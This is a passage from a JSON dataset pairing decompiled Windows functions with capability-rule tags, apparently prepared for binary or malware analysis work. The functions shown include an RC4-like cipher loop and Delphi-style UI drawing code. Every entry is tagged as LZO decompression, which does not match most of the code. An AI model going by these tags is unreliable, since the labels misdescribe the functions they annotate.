fcn.0040546c();\n    uStack1080 = 0x44c60b;\n    fcn.00406024();\n    uStack1080 = 0x44c618;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1537
    },
    "0044c628": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044c628(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    int32_t var_1ch;\n    uint8_t var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    puStack1076 = 0x44c653;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    puStack1076 = 0x44c65b;\n    fcn.004058ec();\n    uStack1080 = 0x44c8f4;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbc4;\n    iVar4 = var_8h;\n    if (var_8h != 0) {\n        iVar4 = *(var_8h + -4);\n    }\n    if (iVar4 != 0) {\n        iVar4 = var_4h;\n        if (var_4h != 0) {\n            iVar4 = *(var_4h + -4);\n        }\n        if (iVar4 != 0) {\n            puStack1076 = &stack0xfffffffc;\n            fcn.0044c1c0();\n            fcn.00405504();\n            iVar4 = var_8h;\n            if (var_8h != 0) {\n                iVar4 = *(var_8h + -4);\n            }\n            if (iVar4 < 0x101) {\n                iVar4 = var_8h;\n                if (var_8h != 0) {\n                    iVar4 = *(var_8h + -4);\n                }\n                fcn.00406858(iVar4);\n                fcn.0040595c();\n                fcn.0044c138();\n            }\n            else {\n                fcn.00406858(0x100);\n                fcn.0040595c();\n                fcn.0044c138();\n            }\n            iVar4 = 0;\n            piVar1 = &fcn.0044c628::var_41ch;\n            do {\n                *piVar1 = iVar4;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            iVar4 = 0;\n            piVar1 = &fcn.0044c628::var_41ch;\n            do {\n                iVar5 = var_8h;\n                if (var_8h != 0) {\n                    iVar5 = *(var_8h + -4);\n                }\n                uVar3 = *(var_ch + iVar4 % iVar5) + uVar3 + *piVar1 & 0x800000ff;\n                if (uVar3 < 0) {\n                    uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                }\n                var_15h = *piVar1;\n                *piVar1 = (&fcn.0044c628::var_41ch)[uVar3];\n                (&fcn.0044c628::var_41ch)[uVar3] = var_15h;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            uVar6 = 0;\n            iVar4 = var_4h;\n            if (var_4h != 0) {\n                iVar4 = *(var_4h + -4);\n            }\n            fcn.00406858(iVar4);\n            fcn.0040595c();\n            fcn.0044c138();\n            if (var_4h != 0) {\n                var_4h = *(var_4h + -4);\n            }\n            if (-1 < var_4h + -1) {\n                var_1ch = var_4h;\n                iVar4 = 0;\n                do {\n                    uVar3 = uVar3 + 1 & 0x800000ff;\n                    if (uVar3 < 0) {\n                        uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                    }\n                    uVar6 = uVar6 + (&fcn.0044c628::var_41ch)[uVar3] & 0x800000ff;\n                    if (uVar6 < 0) {\n                        uVar6 = (uVar6 - 1 | 0xffffff00) + 1;\n                    }\n                    var_15h = *(&fcn.0044c628::var_41ch + uVar3);\n                    (&fcn.0044c628::var_41ch)[uVar3] = (&fcn.0044c628::var_41ch)[uVar6];\n                    (&fcn.0044c628::var_41ch)[uVar6] = var_15h;\n                    uVar2 = (&fcn.0044c628::var_41ch)[uVar3] + (&fcn.0044c628::var_41ch)[uVar6] & 0x800000ff;\n                    if (uVar2 < 0) {\n                        uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n                    }\n                    *(var_10h + iVar4) = *(var_10h + iVar4) ^ *(&fcn.0044c628::var_41ch + uVar2);\n                    iVar4 = iVar4 + 1;\n                    var_1ch = var_1ch + -1;\n                } while (var_1ch != 0);\n            }\n            fcn.00405b8c();\n            fcn.0040595c();\n            fcn.0044c138();\n        }\n    }\n    *in_FS_OFFSET = uStack1084;\n    puStack1076 = 0x44c8fb;\n    uStack1080 = 0x44c8d3;\n    fcn.0040546c();\n    uStack1080 = 0x44c8e6;\n    fcn.00406024();\n    uStack1080 = 0x44c8f3;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1519
    },
    "0044d018": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0044d018(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x44d0c7;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405b8c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004058fc(iVar2);\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1);\n    fcn.00405b8c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar3) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.00405784();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405490(0x44d0ce);\n    return;\n}\n",
        "token_count": 326
    },
    "00453b60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00453b60(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    if (param_2 <= iVar2) {\n        uVar1 = fcn.004058fc();\n        fcn.004058fc(uVar1);\n        iVar2 = fcn.00409a58();\n        if (iVar2 == 0) {\n            var_5h = 1;\n            fcn.004059a4();\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 219
    },
    "00453be8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00453caf)\n\nvoid fcn.00453be8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int16_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = 0x453c01;\n    fcn.004058ec();\n    uStack40 = 0x453d0b;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    do {\n        do {\n            cVar1 = fcn.00453b60();\n        } while (cVar1 != '\\0');\n        cVar1 = fcn.00453b60();\n    } while (((cVar1 != '\\0') || (cVar1 = fcn.00453b60(),  cVar1 != '\\0')) || (cVar1 = fcn.00453b60(),  cVar1 != '\\0'));\n    if (in_EAX != 0) {\n        iVar4 = 8;\n        do {\n            fcn.00453968();\n            iVar3 = in_EAX;\n            if (in_EAX != 0) {\n                iVar3 = *(in_EAX + -4);\n            }\n            uVar2 = fcn.004058fc(0);\n            fcn.004058fc(iVar3, uVar2);\n            uStack44 = 0x400;\n            iVar3 = sub.kernel32.dll_CompareStringA_1();\n        } while ((iVar3 != 2) && (iVar4 = iVar4 + 1,  iVar4 != 0x256));\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x453d12;\n    uStack40 = 0x453d02;\n    fcn.0040546c();\n    uStack40 = 0x453d0a;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 489
    },
    "0045490c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00454958)\n// WARNING: Removing unreachable block (ram,0x00454962)\n\nvoid __cdecl fcn.0045490c(uint32_t arg_8h, uint arg_ch, uint *lprc)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint *in_FS_OFFSET;\n    uchar uVar6;\n    uint uStackY120;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack52 = 0x454af8;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    iVar2 = fcn.00456988();\n    if ((iVar2 != 0) && (cVar1 = fcn.00458208(),  cVar1 != '\\0')) {\n        arg_8h = arg_8h | 0x20002;\n    }\n    fcn.00405504();\n    uVar6 = (arg_8h & 0x400) == 0;\n    if ((!uVar6) &&\n       ((uVar6 = var_4h == NULL,  uVar6 || ((uVar6 = *var_4h == '&',  uVar6 && (uVar6 = var_4h[1] == '\\0',  uVar6))))))\n    {\n        fcn.00405738();\n    }\n    fcn.00405894();\n    if (uVar6) {\n        if ((arg_8h & 0x400) == 0) {\n            var_1ch = *lprc;\n            uStack24 = lprc[2];\n            uStack20 = lprc[3];\n            var_18h = lprc[1] + 4;\n            uVar3 = fcn.00428b60(&var_1ch, 6, 2);\n            sub.user32.dll_DrawEdge(uVar3);\n        }\n        goto code_r0x00454ae2;\n    }\n    fcn.00428520();\n    if (*(in_EAX + 0x3a) != '\\0') {\n        fcn.00427ec8();\n        fcn.00427ed4();\n    }\n    if (*(in_EAX + 0x39) == '\\0') {\n        if (arg_ch == '\\0') {\n            sub.user32.dll_OffsetRect(lprc, 1, 1);\n            fcn.00427b48();\n            pcVar5 = var_4h;\n            if (var_4h != NULL) {\n                pcVar5 = *(var_4h + -4);\n            }\n            uVar3 = fcn.004058fc(pcVar5, lprc, arg_8h);\n            uVar3 = fcn.00428b60(uVar3);\n            sub.user32.dll_DrawTextA(uVar3);\n            sub.user32.dll_OffsetRect(lprc, 0xffffffff, 0xffffffff);\n        }\n        if (arg_ch != '\\0') {\n            iVar2 = fcn.0042767c();\n            iVar4 = fcn.0042767c();\n            if (iVar2 == iVar4) {\n                fcn.00427b48();\n                goto code_r0x00454ab9;\n            }\n        }\n        fcn.00427b48();\n    }\ncode_r0x00454ab9:\n    pcVar5 = var_4h;\n    if (var_4h != NULL) {\n        pcVar5 = *(var_4h + -4);\n    }\n    uVar3 = fcn.004058fc(pcVar5, lprc, arg_8h);\n    uStackY120 = fcn.00428b60(uVar3);\n    sub.user32.dll_DrawTextA();\ncode_r0x00454ae2:\n    *in_FS_OFFSET = uStackY120;\n    fcn.0040546c(0x454aff);\n    return;\n}\n",
        "token_count": 963
    },
    "00456e34": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456e34(int32_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint in_stack_ffffffb8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    char var_9h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    uStack44 = 0x456f77;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    var_9h = '\\0';\n    var_10h = *in_EAX;\n    iVar2 = var_10h;\n    if (var_10h != 0) {\n        iVar2 = *(var_10h + -4);\n    }\n    if (0 < iVar2) {\n        iVar4 = 1;\n        do {\n            uVar3 = *(*in_EAX + -1 + iVar4);\n            if ((*(*0x4a5158 + (uVar3 >> 3)) >> (uVar3 & 7) & 1) != 0) {\n                var_9h = '\\x01';\n                break;\n            }\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    var_8h = param_1;\n    var_4h = param_2;\n    if (var_9h == '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (param_1 != 0) {\n            fcn.004059ec();\n            puVar1 = puStack40;\n        }\n    }\n    else {\n        var_10h = *in_EAX;\n        iVar2 = var_10h;\n        if (var_10h != 0) {\n            iVar2 = *(var_10h + -4);\n        }\n        uVar5 = iVar2 == 2;\n        puStack40 = &stack0xfffffffc;\n        fcn.00405964(&var_14h);\n        fcn.00405894();\n        if (uVar5) {\n            var_10h = *in_EAX;\n            fcn.00405964(&var_18h);\n            in_stack_ffffffb8 = var_4h;\n            fcn.00405800(0x456f8c, 0x456fb0, var_4h, 0x456fa4, 0x456f98, var_18h);\n            puVar1 = puStack40;\n        }\n        else {\n            in_stack_ffffffb8 = 0x456fb0;\n            fcn.00405800(0x456fb0, var_4h, 0x456fa4, 0x456f98, *in_EAX);\n            puVar1 = puStack40;\n        }\n    }\n    puStack40 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffb8;\n    fcn.00405490(0x456f7e);\n    return;\n}\n",
        "token_count": 767
    },
    "00456fb4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00456fb4(uint param_1, uchar param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar uVar7;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar *var_38h;\n    uint *var_34h;\n    uint uStack52;\n    int32_t *var_2ch;\n    uchar auStack44 [3];\n    uint var_25h;\n    int32_t var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 0x8;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != NULL);\n    var_20h = 0x45743c;\n    unique0x00007a00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00456fb4::var_25h + 1;\n    _auStack44 = CONCAT13(param_2, auStack44) & 0xff00ffff;\n    puVar1 = &stack0xfffffffc;\n    var_18h = unaff_EDI;\n    if (var_25h == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            _auStack44 = 0x456ff5;\n            cVar2 = fcn.004575f4();\n            puVar1 = var_1ch;\n            if (cVar2 != '\\0') goto code_r0x00456ffd;\n        }\n        *in_FS_OFFSET = stack0xffffffd8;\n        var_1ch = 0x457443;\n        var_20h = 0x457426;\n        fcn.00405490();\n        var_20h = 0x457433;\n        fcn.00405490();\n        var_20h = 0x45743b;\n        fcn.0040546c();\n        return;\n    }\ncode_r0x00456ffd:\n    var_1ch = puVar1;\n    _auStack44 = 0x45700b;\n    fcn.00405504();\n    var_ch = NULL;\n    var_14h = NULL;\n    var_8h = NULL;\n    var_10h = 0;\n    var_2ch = 0x457405;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    var_34h = 0x45703e;\n    _auStack44 = &stack0xfffffffc;\n    var_ch = fcn.00404610();\n    var_34h = 0x45704d;\n    var_14h = fcn.00404610();\n    var_34h = 0x45705c;\n    var_2ch = fcn.00404610();\n    var_34h = 0x45706b;\n    var_8h = fcn.00404610();\n    var_34h = 0x457075;\n    iVar3 = fcn.004563c8();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x45708d;\n            iVar3 = fcn.004563d8();\n            uVar7 = *(iVar3 + 0x3e) == '\\0';\n            if (!uVar7) {\n                var_34h = 0x4570a0;\n                fcn.004563d8();\n                var_34h = 0x4570ad;\n                fcn.00405894();\n                if (!uVar7) {\n                    var_34h = 0x4570bc;\n                    iVar3 = fcn.004563d8();\n                    if (*(iVar3 + 0x30) != 0) {\n                        var_34h = 0x4570cf;\n                        fcn.004563d8();\n                        var_34h = 0x4570da;\n                        fcn.004591ac();\n                        var_34h = 0x4570e5;\n                        fcn.004096d8();\n                        if (var_1ch == NULL) {\n                            var_34h = 0x4570f4;\n                            var_34h = fcn.004563d8();\n                            var_38h = 0x4570fe;\n                            fcn.004563d8();\n                            var_38h = 0x45710b;\n                            (**(*var_2ch + 100))();\n                        }\n                        else {\n                            var_34h = 0x45711b;\n                            iVar3 = fcn.0040e7c8();\n                            if (iVar3 != 0) {\n                                var_38h = 0x457128;\n                                var_34h = &stack0xfffffffc;\n                                cVar2 = fcn.00456d80(&stack0xfffffffc);\n                                if (cVar2 == '\\0') {\n                                    var_34h = 0x457136;\n                                    iVar3 = fcn.004563d8();\n                                    var_34h = iVar3 + 0x30;\n                                    var_38h = 0x457143;\n                                    fcn.004563d8();\n                                    var_38h = 0x45714e;\n                                    fcn.004590bc();\n                                    var_34h = 0x457157;\n                                    fcn.004054c0();\n                                    var_34h = 0x457160;\n                                    var_34h = fcn.004563d8();\n                                    var_38h = 0x45716a;\n                                    fcn.004563d8();\n                                    var_38h = 0x457177;\n                                    (**(*var_2ch + 100))();\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        } while (var_34h != 0x1);\n    }\n    var_34h = 0x45718c;\n    fcn.00405504();\n    var_34h = 0x457194;\n    iVar3 = (**(*var_2ch + 0x14))();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x4571ac;\n            fcn.00405504();\n            var_34h = 0x4571b7;\n            (**(*var_14h + 8))();\n            var_34h = 0x4571bf;\n            (**(*var_ch + 0x44))();\n            var_34h = 0x4571c7;\n            iVar3 = (**(*var_14h + 0x14))();\n            iVar3 = iVar3 + -1;\n            if (-1 < iVar3) {\n                do {\n                    var_34h = 0x4571e0;\n                    (**(*var_14h + 0xc))();\n                    iVar6 = 1;\n                    while( true ) {\n                        var_34h = 0x457284;\n                        iVar5 = fcn.0040572c();\n                        if (iVar5 < iVar6) break;\n                        uVar4 = *(var_20h + -1 + iVar6);\n                        if ((*(*0x4a5158 + (uVar4 >> 3)) >> (uVar4 & 7) & 1) == 0) {\n                            var_34h = &fcn.00456fb4::var_40h;\n                            var_38h = 0x457216;\n                            fcn.00405964();\n                            var_38h = 0x457221;\n                            fcn.004096d8();\n                            var_3ch = 0x45722a;\n                            var_38h = &stack0xfffffffc;\n                            cVar2 = fcn.00456d80(&stack0xfffffffc);\n                            if (cVar2 != '\\0') {\n                                if (*(*0x4a5178 + 0xc) == '\\0') {\n                                    var_38h = 0x457258;\n                                    fcn.004059ec();\n                                }\n                                else {\n                                    var_38h = 0x457247;\n                                    fcn.00456e34();\n                                }\n                                var_38h = 0x457262;\n                                (**(*var_14h + 0x18))();\n                                var_38h = 0x45726f;\n                                (**(*var_ch + 0x3c))();\n                                var_38h = 0x457279;\n                                (**(*var_14h + 0x48))();\n                                break;\n                            }\n                        }\n                        else {\n                            iVar6 = iVar6 + 1;\n                        }\n                        iVar6 = iVar6 + 1;\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_34h = 0x45729e;\n            iVar3 = (**(*var_ch + 0x14))();\n            if (var_10h < iVar3) {\n                var_38h = 0x4572a9;\n                var_34h = &stack0xfffffffc;\n                fcn.00456db0(&stack0xfffffffc);\n            }\n            var_34h = 0x4572b2;\n            iVar3 = (**(*var_14h + 0x14))();\n            if (iVar3 < 1) break;\n            var_34h = 0x4572be;\n            iVar3 = (**(*var_14h + 0x14))();\n            if (-1 < iVar3 + -1) {\n                do {\n                    var_34h = 0x4572d2;\n                    (**(*var_14h + 0x18))();\n                    var_34h = 0x4572dc;\n                    (**(*var_2ch + 0x5c))();\n                    var_34h = 0x4572e6;\n                    (**(*var_2ch + 0x14))();\n                    var_34h = 0x4572f3;\n                    (**(*var_2ch + 0x70))();\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n        } while (var_34h != 0x1);\n    }\n    if (var_10h == 0) {\n        var_38h = 0x45730c;\n        var_34h = &stack0xfffffffc;\n        fcn.00456db0(&stack0xfffffffc);\n    }\n    var_34h = 0x457315;\n    iVar3 = (**(*var_8h + 0x14))();\n    auStack44 = CONCAT12(0 < iVar3, auStack44._0_2_);\n    _auStack44 = _auStack44 & 0xff000000 | auStack44;\n    var_34h = 0x457323;\n    iVar3 = (**(*var_8h + 0x14))();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x45733f;\n            (**(*var_8h + 0xc))();\n            if (*(*0x4a5178 + 0xc) != '\\0') {\n                var_34h = 0x457357;\n                iVar3 = fcn.0040e7c8();\n                if ((iVar3 == 0) && (var_18h != 0)) {\n                    var_34h = 0x45736e;\n                    iVar3 = fcn.0040e7c8();\n                    if (iVar3 == 0) {\n                        var_34h = &fcn.00456fb4::var_44h;\n                        var_38h = 0x457391;\n                        fcn.00405964();\n                        var_38h = 0x45739e;\n                        fcn.00456e34();\n                        var_38h = 0x4573b8;\n                        fcn.004059a4();\n                    }\n                }\n            }\n            var_34h = 0x4573c2;\n            (**(*var_8h + 0x18))();\n            var_34h = 0x4573cd;\n            fcn.004054c0();\n            var_34h = var_34h + -1;\n        } while (var_34h != NULL);\n    }\n    *in_FS_OFFSET = uStack52;\n    _auStack44 = 0x45740c;\n    var_2ch = 0x4573ec;\n    fcn.00404640();\n    var_2ch = 0x4573f4;\n    fcn.00404640();\n    var_2ch = 0x4573fc;\n    fcn.00404640();\n    var_2ch = 0x457404;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 3033
    },
    "0045827c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x00458312)\n// WARNING: Removing unreachable block (ram,0x0045832a)\n\nvoid __cdecl fcn.0045827c(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint16_t in_DX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack44 = &var_2h + 2;\n    uStack48 = 0x4583a7;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    if ((in_DX & 0x10) == 0) {\n        iVar1 = fcn.0045784c();\n        if ((iVar1 != 0) && (iVar2 = fcn.004563c8(),  in_ECX < iVar2)) {\n            iVar1 = fcn.004563d8();\n        }\n    }\n    else {\n        puStack44 = &var_2h + 2;\n        sub.user32.dll_GetSubMenu();\n        iVar1 = fcn.0045784c();\n        uStack60 = in_EAX;\n    }\n    if ((iVar1 != 0) && (*(iVar1 + 0x30) != 0)) {\n        fcn.00405654();\n        fcn.00405654();\n        fcn.00405654(0);\n        uVar3 = fcn.004058fc();\n        fcn.00405654(0, uVar3);\n        uVar3 = fcn.004058fc();\n        iVar1 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar3);\n        if (iVar1 == 2) {\n            fcn.004591ac();\n        }\n    }\n    *in_FS_OFFSET = uStack60;\n    uStack52 = 0x4583ae;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 524
    },
    "004590bc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004590bc(uint param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    fcn.004054c0();\n    for (iVar3 = 1; iVar2 = fcn.0040572c(),  iVar3 <= iVar2; iVar3 = iVar3 + 1) {\n        uVar1 = *(*param_2 + -1 + iVar3);\n        if ((*(*0x4a5158 + (uVar1 >> 3)) >> (uVar1 & 7) & 1) == 0) {\n            if (*(*param_2 + -1 + iVar3) == '&') {\n                if (*(*0x4a5178 + 0xc) == '\\0') {\n                    bVar4 = false;\n                }\n                else {\n                    if (iVar3 < 2) {\n                        bVar4 = false;\n                    }\n                    else {\n                        iVar2 = *param_2;\n                        if (iVar2 != 0) {\n                            iVar2 = *(iVar2 + -4);\n                        }\n                        bVar4 = 1 < iVar2 - iVar3;\n                    }\n                    if (bVar4) {\n                        bVar4 = *(*param_2 + -2 + iVar3) == '(';\n                    }\n                    else {\n                        bVar4 = false;\n                    }\n                    if (bVar4) {\n                        bVar4 = *(*param_2 + 1 + iVar3) == ')';\n                    }\n                    else {\n                        bVar4 = false;\n                    }\n                }\n                if (bVar4) {\n                    fcn.004059a4();\n                }\n                else {\n                    fcn.004059a4();\n                }\n            }\n        }\n        else {\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 413
    },
    "004591ac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004591ac(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    fcn.0040546c();\n    iVar3 = 1;\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    if (0 < iVar1) {\n        do {\n            uVar2 = *(in_EAX + -1 + iVar3);\n            if ((*(*0x4a5158 + (uVar2 >> 3)) >> (uVar2 & 7) & 1) == 0) {\n                if (((*(in_EAX + -1 + iVar3) == '&') && (0 < iVar1 - iVar3)) &&\n                   (iVar3 = iVar3 + 1,  *(in_EAX + -1 + iVar3) != '&')) {\n                    fcn.00405654();\n                }\n            }\n            else {\n                iVar3 = iVar3 + 1;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 <= iVar1);\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "00459214": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045925e)\n// WARNING: Removing unreachable block (ram,0x0045926a)\n\nvoid fcn.00459214(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x4592b7;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    fcn.004590bc();\n    fcn.004590bc();\n    uVar1 = fcn.004058fc(0);\n    uVar1 = fcn.004058fc(0, uVar1);\n    uVar2 = 0x400;\n    sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x4592be);\n    return;\n}\n",
        "token_count": 262
    },
    "00463da4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463da4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    int32_t iStack72;\n    uint uVar6;\n    uint arg_ch;\n    uint var_34h;\n    uint lpEventTrack;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *param_2;\n    if (iVar4 < 0x100) {\n        if (0x1f < iVar4) {\n            if (iVar4 == 0x21) {\n                cVar1 = fcn.00463ba4();\n                if (cVar1 != '\\0') {\n                    if (param_2[3] != 0) {\n                        return;\n                    }\n                    cVar1 = fcn.00466fb4();\n                    if (cVar1 == '\\0') {\n                        return;\n                    }\n                    fcn.004602d8();\n                    return;\n                }\n            }\n            else if (iVar4 == 0x84) {\n                fcn.004602d8();\n                if (param_2[3] != -1) {\n                    return;\n                }\n                arg_ch = 0;\n                uVar6 = 0;\n                iStack72 = 0x463f6b;\n                fcn.0045ea84();\n                iStack72 = 0x463f78;\n                iVar4 = fcn.00463ae0(uVar6, arg_ch);\n                if (iVar4 == 0) {\n                    return;\n                }\n                param_2[3] = 1;\n                return;\n            